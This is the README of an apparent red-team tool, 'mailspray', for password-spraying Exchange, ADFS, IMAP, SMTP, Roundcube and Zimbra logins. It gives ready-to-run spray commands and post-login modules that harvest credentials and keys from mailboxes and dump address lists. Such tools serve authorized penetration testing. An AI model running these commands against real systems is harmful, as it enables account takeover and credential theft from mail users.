# mailspray **v0.5.7**

```
    ███╗   ███╗ █████╗ ██╗██╗     ███████╗██████╗ ██████╗  █████╗ ██╗   ██╗
    ████╗ ████║██╔══██╗██║██║     ██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
    ██╔████╔██║███████║██║██║     ███████╗██████╔╝██████╔╝███████║ ╚████╔╝
    ██║╚██╔╝██║██╔══██║██║██║     ╚════██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝
    ██║ ╚═╝ ██║██║  ██║██║███████╗███████║██║     ██║  ██║██║  ██║   ██║
    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝
                                          v0.5.7 // mail password spraying toolkit
```

CLI for password spraying against mail stacks: OWA, EWS, ADFS, IMAP, SMTP, Roundcube, Zimbra. Batching, delay and jitter between batches, per-user attempt limits, protocol-aware username formatting.

**NetExec-style modules (`-M`)** for post-auth actions — `cred_scan` (hunt credentials/VPN/secrets in a mailbox over IMAP) and `gal` (dump the Global Address List from OWA/EWS). Findings (valid creds + module loot) are stored in a per-workspace SQLite DB under `~/.mailspray/workspaces/`.

**Authorized security testing only.**

Full flag reference (same layout as below): `mailspray --help`

---

## Install

```bash
pipx install git+https://github.com/s0ld13rr/mailspray.git
mailspray --help
```

Or clone and `pipx install .`. Requires Python **3.9+**. After PyPI publish: `pipx install mailspray`.

**Upgrade:** from a clone, run **`pipx install . --force`** in the repo root (reinstalls from your current tree into the pipx venv; does not change `__version__` in source). From GitHub only: `pipx install git+https://github.com/s0ld13rr/mailspray.git --force`. The command `pipx upgrade mailspray` works if you run it from a directory that does not contain a **`mailspray/`** package folder (for example your home directory), otherwise pipx can confuse the path with the project.

Optional **local Docker lab** (GreenMail, Roundcube): keep compose and fixtures under **`.cursor/lab/`** (gitignored tree). Runbook (standard vs **`.cursor/lab/docker-compose.free-host-ports.yml`**, **pipx install . --force**, copy-paste checks): **`.cursor/docs/local-mail-lab.md`**. **A mail server must listen on the target host:port** before spray, or attempts fail at connect (use **`-v`** to separate transport errors from bad passwords).

**Using your clone in pipx:** after you pull or edit code, reinstall from the repo root with **`pipx install . --force`** so the **`mailspray`** command matches the tree.

---

## Usage overview

```
mailspray [-P PORT] (-u USER | -k USER) -p PASS [-d DOMAIN] [-F FMT] [-A URI] [-t N] [-f] [-e SEC] [-B SCOPE] [-J 0-1] [-T SEC] [-n N] [-S] [-D] [-o PATH] [-j PATH] [-v] [-q] [-h] [-V]
          PROTOCOL TARGET
```

### TARGET

| | |
|:---|:---|
| **PROTOCOL** | `owa`, `ews`, `adfs`, `imap`, `smtp`, `roundcube`, `zimbra` |
| **TARGET** | Host, IP, or URL (e.g. `http://mail.corp.com:8080`) |
| **-P, --port** | Override default port |

### CREDENTIALS

| | |
|:---|:---|
| **-u, --user** | Username or file with usernames (spray mode) |
| **-k, --probe** | Single-user probe: one login attempt, then exit |
| **-p, --password** | Password or file with passwords |
| **-d, --domain** | Domain applied to usernames (format auto per protocol) |
| **-F, --user-format** | `auto`, `domain_prefix` (`CORP\user`), `upn` (`user@domain`), `plain` |
| **-A, --adfs-applies-to** | ADFS AppliesTo URI (default: `urn:federation:MicrosoftOnline`) |

### ENGINE

| | |
|:---|:---|
| **-t, --threads** | Batch size: concurrent requests per round (default: 5) |
| **-f, --fast** | Fast mode: 30 threads if `-t` not set (internal targets) |
| **-e, --delay** | Delay **between batches** in seconds |
| **-B, --delay-scope** | `batch` only (`request` not implemented) |
| **-J, --jitter** | Jitter factor for delay (0.0–1.0) |
| **-T, --timeout** | Connection timeout in seconds (default: 10) |
| **-n, --max-attempts** | Max logins per user before skip (0 = unlimited) |
| **-S, --stop-on-success** | Stop further passwords for that user after first hit |
| **-D, --debug** | Verbose protocol debug where supported |

### OUTPUT

| | |
|:---|:---|
| **-o, --output** | Append valid creds to PATH (absolute or relative with dirs; bare names rejected; never inside package tree) |
| **-j, --json** | JSON file of found creds (same path rules as `-o`) |
| **-v, --verbose** | Show failures, skips, errors |
| **-q, --no-progress** | Hide live progress line |

### MODULES

| | |
|:---|:---|
| **-M, --module NAME** | Run a post-auth module after successful login (e.g. `cred_scan`, `gal`) |
| **-L, --list-modules** | List available modules and exit |
| **-O, --module-options KEY=VAL** | Module option, repeatable (e.g. `-O folders=INBOX,Sent -O max=200`) |
| **-w, --workspace NAME** | Findings workspace DB (`~/.mailspray/workspaces/NAME.db`; default: `default`) |

### MISC

| | |
|:---|:---|
| **-h, --help** | Help |
| **-V, --version** | Version |

---

## Examples

```bash
# Probe one user (EWS)
mailspray ews https://mail.corp.local -k auditor1 -p 'Secret!' -d CORP -F upn -T 15 -D

# External OWA — delay between batches, cap attempts per user
mailspray owa mail.corp.com -u users.txt -p 'Winter2026!' -d CORP -n 3 -S -e 30 -J 0.3

# OWA spray + JSON
mailspray owa https://owa.corp.com -u users.txt -p passes.txt -d CORP -F upn -e 0 -t 8 -S -j /tmp/mailspray-results.json

# ADFS — UPN from -d
mailspray adfs adfs.corp.com -u users.txt -p passes.txt -d corp.local -n 3 -S -e 30 -J 0.3

# EWS
mailspray ews https://mail.corp.com -u users.txt -p passes.txt -d CORP -n 3 -S -e 20 -J 0.5

# Internal — fast (30 threads if -t omitted)
mailspray imap 192.168.1.10 -u users.txt -p 'Password1' -f
mailspray owa 10.10.10.5 -u users.txt -p passes.txt -d CORP -f -n 3

# SMTP
mailspray smtp smtp.target.com -u emails.txt -p passwords.txt -e 5 -J 0.4
mailspray smtp smtp.corp.com -u users.txt -p passes.txt -d corp.local -F upn

# Roundcube custom port
mailspray roundcube http://mail.corp.com:8080 -u users.txt -p pass.txt -d corp.com

# Zimbra + JSON
mailspray zimbra http://webmail.target.com:8443 -u users.txt -p 'Spring2026!' -d target.com -j /tmp/mailspray-results.json
```

---

## Modules (`-M`)

NetExec-style post-auth modules run *after* a successful login and store findings in the workspace DB.

```bash
# List modules
mailspray -L

# cred_scan — hunt secrets in a mailbox over IMAP (bodies + text attachments, all folders)
mailspray imap mail.corp.com -u user -p 'Pass!' -M cred_scan
mailspray imap mail.corp.com -u user -p 'Pass!' -M cred_scan -O folders=INBOX,Sent -O max=200 -O since=01-Jan-2025

# gal — dump the Global Address List from OWA (FindPeople) or EWS (ResolveNames)
mailspray owa https://owa.corp.com -u user -p 'Pass!' -d CORP -M gal -O out=/tmp/gal.txt
mailspray ews https://mail.corp.com -u user -p 'Pass!' -d CORP -M gal -O prefix=smith
```

| Module | Protocols | What it does |
|:---|:---|:---|
| **cred_scan** | `imap` | Scans message bodies and text attachments for passwords, private keys, API keys, VPN configs, connection strings, and inline URL credentials. Uses `BODY.PEEK` — never marks mail as read. Options: `folders`, `max`, `since`, `attachments`. |
| **gal** | `owa`, `ews` | Dumps the Global Address List. OWA path reuses the authenticated cookie session against `/owa/service.svc?action=FindPeople` (MailSniper technique); EWS path sweeps `ResolveNames` (Basic auth). Options: `prefix`, `max`, `out`. |

**Findings store.** Every valid credential (from spraying *or* module runs) plus all module loot is written to a per-workspace SQLite DB at `~/.mailspray/workspaces/<name>.db` (default workspace `default`, override with `-w`). Tables: `credentials` and `loot`. Writes are best-effort and never abort a run.

```bash
sqlite3 ~/.mailspray/workspaces/default.db 'select category, key, source from loot;'
```

---

## Supported protocols

```
owa           Outlook Web Access (Exchange)           [443]  auto: CORP\user
ews           Exchange Web Services (NTLM/Basic)      [443]  auto: CORP\user
adfs          AD Federation Services (WS-Trust)       [443]  auto: user@domain
imap          IMAP / IMAPS                            [auto] 143,993  plain
smtp          SMTP / SMTPS                            [auto] 25,465,587,…  plain
roundcube     Roundcube Webmail                       [443]  auto: user@domain
zimbra        Zimbra Webmail                          [443]  auto: user@domain
```

---

**Homepage:** [github.com/s0ld13rr/mailspray](https://github.com/s0ld13rr/mailspray)
